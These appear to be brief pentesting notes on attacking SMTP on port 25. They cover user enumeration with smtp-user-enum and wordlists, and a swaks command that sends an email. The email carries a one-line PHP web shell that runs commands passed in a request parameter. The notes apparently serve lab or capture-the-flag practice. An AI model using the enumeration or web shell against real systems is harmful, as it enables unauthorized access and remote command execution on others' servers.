# smtp :25

## User enum

check for any possible usernames / department names available

```bash
# takes time to run
smtp-user-enum [flag]-U <user-list> -t <IP/Domain>
- /usr/share/seclists/Usernames/top-usernames-shortlist.txt
- /usr/share/seclists/Usernames/Names/names.txt
- /usr/share/wordlists/metasploit/unix_users.txt

# flags
# check if mailbox exists
-M RCPT
# check if user exists
-M VRFY
```

## Cheatsheet for commands:

[samlogic.net/smtp-commands-reference.htm](https://www.samlogic.net/articles/smtp-commands-reference.htm)

## Swiss Army Knife for SMTP

* [jetmore/swaks](https://github.com/jetmore/swaks)

```bash
# send auto email
$ swaks --to EMAIL --from kashz --header "Subject: kashz" --body "SHELL or LINK?" --server IP
<?php system($_REQUEST["cmd"]); ?>
```
